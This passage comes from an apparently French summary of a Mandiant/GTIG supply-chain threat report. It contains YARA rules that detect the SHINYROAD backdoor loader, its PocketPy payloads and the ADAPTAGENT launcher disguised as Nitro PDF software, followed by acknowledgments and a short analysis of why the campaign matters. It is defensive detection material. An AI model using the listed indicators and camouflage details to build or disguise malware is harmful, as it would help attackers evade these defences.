			($obf_key and $task1 and $task2 and any of ($sob*))
		)
}
```
```
rule G_APT_Backdoor_SHINYROAD_1
{
	meta:
		author = "Mandiant"
		desc = "Detects the SHINYROAD BlkScrDl.dll COM-staging loader and RuntimeComponent.dll PocketPy engine"
		
	strings:
		// Shared SHINYROAD artifacts (shared memory section and mutex)
		$shm = "Local\\963d3c60-d406-4ad6-aa1e-dc8e45061ccf" ascii wide
		$mtx = "Global\\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883}" ascii wide
		// BlkScrDl.dll loader: config.zip staging and COM server registration
		$ld1 = "%sconfig.zip" ascii
		$ld2 = "%scsvc\\RuntimeComponent.dll" ascii
		$ld3 = "libBlkScrDl.dll" ascii
		$com1 = "Software\\Classes\\CLSID\\%s" ascii
		$com2 = "Software\\Classes\\AppID\\%s" ascii
		$com3 = "%s\\InprocServer32" ascii
		// RuntimeComponent.dll embedded PocketPy engine
		$rc1 = "libRuntimeComponent.dll" ascii
		$rc2 = "metadata.dat" ascii
		$rc3 = "_pyio_compat" ascii
		$rc4 = "_pyio_struct" ascii
		$rc5 = "%sdemo_srv.log" ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 5MB and (
			($shm and $mtx) or
			(($shm or $mtx) and (2 of ($ld*) or 2 of ($rc*))) or
			(2 of ($ld*) and 2 of ($com*)) or
			($rc1 and $rc2 and any of ($rc3, $rc4, $rc5))
		)
}
```
```
rule G_APT_Backdoor_SHINYROAD_2
{
	meta:
		author = "Mandiant"
		desc = "Detects compiled PocketPy bytecode payloads associated with SHINYROAD backdoors"
	strings:
		$pkpy_magic = { 4F 43 01 00 }
		$proto1 = "mct3-handshake-v1" ascii
		$script = "bootstrap_tcp_slim_v2_call_min.py" ascii
		$jam1 = "JAM_BURST_PACKETS_MIN" ascii
		$jam2 = "JAM_MIN_MS" ascii
		$jam3 = "JAM_MAX_BYTES" ascii
		$mod1 = "_pyio_struct" ascii
		$mod2 = "_pyio_compat" ascii
		$enc1 = "nh_enc" ascii
		$enc2 = "encbody" ascii
	condition:
		$pkpy_magic at 0 and filesize < 500KB and (
			$proto1 or
			$script or
			all of ($jam*) or
			(all of ($mod*) and any of ($enc*))
		)
}
```
```
rule G_APT_Launcher_ADAPTAGENT_1
{
	meta:
		author = "Mandiant"
		desc = "Detects UNC7017 ADAPTAGENT post-exploitation loader and sideloaded Adaptix payload (Nitro camouflage)"
		ref = "https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering"
		platforms = "Win"
		rs1 = "14b31918075e6130b9123158743db0a81e2d7bfcf6d39731ee7d9200a98cd591"
	strings:
		// Sideloaded Masquerading & Camouflage
		$camo_exe1 = "NitroPromotion.exe" ascii wide nocase
		$camo_exe2 = "Nitro_Scan2PDFApp.exe" ascii wide nocase
		$camo_dll1 = "Eztwain4.dll" ascii wide nocase
		$camo_dll2 = "Nitro PDF Eztwain4" ascii wide nocase
		$camo_ver = "14.10.1.0" ascii wide
		$camo_copy = "Nitro Software, Inc." ascii wide
		// NitroPromotion Loader & Staging Functionality
		$load1 = "DownloadToLocalAppData" ascii
		$load2 = "ExtractZipToDirectoryA" ascii
		$load3 = "GetTempZipFileNameA" ascii
		$load4 = "CreateScheduledTask" ascii
		// Adaptix C2 & ADAPTAGENT Core Artifacts
		$adapt1 = "Adaptix Crash Analyzer v1.0" ascii
		$adapt2 = "Global\\{8d00c640-48d8-4440-a8e1-660fd37f572a}" ascii wide
		$adapt3 = "\\\\.\\pipe\\%08lx" ascii
		$adapt4 = "13ConnectorHTTP" ascii
		$adapt5 = "9Connector" ascii
	condition:
		uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 10MB and (
			// Branch 1: ADAPTAGENT Sideloaded Payload (Eztwain4.dll)
			(any of ($camo_dll*, $adapt1, $adapt2) and 2 of ($adapt*)) or
			// Branch 2: NitroPromotion Masquerading Loader (NitroPromotion.exe)
			(any of ($camo_exe*) and (2 of ($load*) or any of ($adapt1, $adapt2))) or
			(all of ($camo_ver, $camo_copy) and any of ($camo_exe*) and any of ($load*))
		)
}
```

### Techniques MITRE ATT&CK
Le billet original fournit un tableau de correspondance avec les techniques MITRE ATT&CK associées à cette activité (non reproduit ici dans son détail tabulaire).

### Remerciements
GTIG et Mandiant remercient l'équipe de recherche ManageEngine Threat Analysis Lab (METAL) pour sa découverte initiale de cette activité, son partage proactif de télémétrie, et sa collaboration continue pour sécuriser leur base de clients mutuelle ainsi que l'écosystème logiciel au sens large.

## Pourquoi ça compte
Cette campagne marque une évolution notable des attaques de chaîne d'approvisionnement logicielle : la falsification éphémère de configuration (quelques minutes seulement) déjoue les méthodes de détection classiques et oblige les équipes de sécurité à revoir leurs protocoles de triage et de chasse rétroactive. Elle illustre aussi comment des éditeurs de taille moyenne, souvent moins surveillés que les grands fournisseurs, peuvent devenir des points d'entrée stratégiques pour des campagnes d'espionnage ou de pré-positionnement à grande échelle.
